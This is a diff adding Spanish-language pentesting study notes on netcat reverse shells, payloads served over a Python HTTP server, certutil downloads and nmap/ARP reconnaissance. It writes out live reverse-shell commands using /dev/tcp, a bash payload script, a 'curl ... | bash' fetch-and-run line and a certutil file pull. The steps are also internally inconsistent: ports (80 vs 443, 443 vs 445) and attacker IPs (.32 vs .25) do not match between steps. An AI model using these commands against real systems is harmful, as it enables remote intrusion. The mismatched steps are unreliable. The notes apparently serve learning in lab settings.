@@ -1,0 +1,219 @@
+---
+title: "Conceptos Básicos de Hacking"
+num: "02"
+status: "done"
+---
+
+# 01. Reverse Shells con Netcat
+
+## ¿Qué es Netcat?
+
+Netcat (`nc`) es una herramienta de red que permite leer y escribir datos a través de conexiones TCP/UDP. En pentesting se utiliza para transferir archivos, hacer port scanning y — principalmente — establecer shells remotas.
+
+## ¿Qué es una Reverse Shell?
+
+Una **reverse shell** es una técnica donde la **máquina víctima inicia la conexión** hacia el atacante, no al revés. Esto permite evadir firewalls que bloquean conexiones entrantes hacia la víctima, pero permiten conexiones salientes.
+
+```
+Atacante (escucha) ←──── Víctima (conecta)
+```
+
+## Flujo de ataque
+
+### 1. Conocer tu IP de atacante
+
+```bash
+ip a
+hostname -I
+```
+
+### 2. Ponerse en escucha en la máquina atacante
+
+```bash
+nc -nlvp 443
+```
+
+| Flag | Significado           |
+| ---- | --------------------- |
+| `-n` | Sin resolución DNS    |
+| `-l` | Modo escucha (listen) |
+| `-v` | Verbose               |
+| `-p` | Puerto a usar         |
+
+> **Nota:** Se usa el puerto 443 porque simula tráfico HTTPS legítimo, reduciendo la probabilidad de ser bloqueado por el firewall.
+
+### 3. Ejecutar en la máquina víctima
+
+```bash
+sh -i >& /dev/tcp/192.168.18.32/443 0>&1
+```
+
+Este comando redirige `stdin`, `stdout` y `stderr` de una shell hacia tu IP mediante TCP. Una vez que la víctima lo ejecuta, recibirás la shell en tu listener.
+
+## Generador de Payloads
+
+Para generar reverse shells en distintos lenguajes (Python, PHP, PowerShell, etc.):
+
+🔗 [revshells.com](https://www.revshells.com) — selecciona tu IP, puerto y lenguaje preferido.
+
+---
+
+# 02. Compartir Archivos con Servidor HTTP en Python + Reverse Shell
+
+### 1. Crear el payload
+
+```bash
+nano payload.sh
+```
+
+Dentro del archivo, escribe lo siguiente:
+
+```bash
+#!/bin/bash
+bash -i >& /dev/tcp/192.168.18.32/443 0>&1
+```
+
+Guarda el archivo con `Ctrl + O` y cierra el editor con `Ctrl + X`.
+
+### 2. Levantar el servidor HTTP en la máquina atacante
+
+```bash
+python3 -m http.server 80
+```
+
+Esto levanta un servidor web en el puerto 80, permitiendo que otras máquinas descarguen archivos desde tu equipo.
+
+### 3. Ejecutar el payload desde la máquina víctima
+
+```bash
+curl http://192.168.18.25:443/payload.sh | bash
+```
+
+Este comando descarga el script desde la máquina atacante y lo ejecuta directamente en la víctima.
+
+### 4. Escuchar la conexión entrante
+
+En la máquina atacante, ejecuta:
+
+```bash
+sudo nc -nlvp 445
+```
+
+Cuando la víctima ejecute el payload, recibirás la shell en este listener.
+
+---
+
+# 03. Compartir Archivos por Red en Máquinas Windows
+
+### 1. Crear el archivo a compartir
+
+```bash
+touch compartir.mp4
+```
+
+### 2. Verificar tu IP en la máquina atacante
+
+```bash
+ifconfig
+```
+
+Anota la dirección IP que usarás en el siguiente paso.
+
+### 3. Levantar el servidor HTTP
+
+```bash
+python3 -m http.server 80
+```
+
+### 4. Descargar el archivo desde Windows
+
+Abre el `cmd` en la máquina Windows y ejecuta:
+
+```cmd
+certutil -split -urlcache -f http://192.168.18.25/compartir.mp4 compartir.mp4
+```
+
+Este comando descarga el archivo desde la máquina atacante y lo guarda localmente con el mismo nombre.
+
+# 04. Reconocimiento de Red
+
+Antes de escanear necesitamos saber en qué interfaz y red estamos:
+
+```bash
+ifconfig
+```
+
+Busca tu interfaz activa (ej. `eth0`) y el rango de red (ej. `192.168.1.0/24`).
+
+## arp-scan
+
+Descubre equipos en tu segmento enviando paquetes ARP — trabaja en capa 2, más rápido que nmap para redes locales:
+
+```bash
+arp-scan -I eth0 --localnet
+```
+
+## netdiscover
+
+Alternativa pasiva/activa, útil en entornos virtuales (VirtualBox/VMware):
+
+```bash
+netdiscover -i eth0 -r 192.168.1.0/24
+```
+
+## nmap
+
+El más completo — permite escanear y exportar resultados:
+
+```bash
+# Escaneo de hosts activos (sin escaneo de puertos)
+nmap -sn 192.168.1.0/24
+
+# Exportar a archivo
+nmap -sn 192.168.1.0/24 -oN hosts_activos.txt
+```
+
+> `-sn` = ping scan. Rápido para descubrir qué IPs están activas antes de profundizar.
+
+## Identificar SO por TTL
+
+Con `ping` puedes inferir el sistema operativo de un host:
+
+```bash
+ping -c 1 192.168.1.25
+```
+
+Fíjate en el valor `ttl` de la respuesta:
+
+| TTL | Sistema Operativo |
+| --- | ----------------- |
+| 64  | Linux / Unix      |
+| 128 | Windows           |
+
+> El TTL real puede ser menor por los saltos intermedios — lo importante es si se acerca más a 64 o a 128.
+
+## Flujo recomendado
+
+```bash
+# 1. Identificar tu red
+ifconfig
+
+# 2. Descubrir hosts activos (elige uno)
+arp-scan -I eth0 --localnet
+netdiscover -i eth0 -r 192.168.1.0/24
+nmap -sn 192.168.1.0/24 -oN hosts_activos.txt
+
+# 3. Identificar SO por TTL
+ping -c 1 <IP_objetivo>
+
+```
+
+# 05. Escaneos Básico con Nmap
+
+Para obtener información de una maquina, para obtener que puertos estan abiertos en una maquina, podemos realizarlo con nmap
+
+nmap 192.168.1.25
+
+Con los siguioentes parametros se puede obtenr mas detalles
+
+nmap -p- --open -sS -sC -sV --min-rate 2000 -n -vvv -Pn 192.168.1.25 -oN escaneo.txt
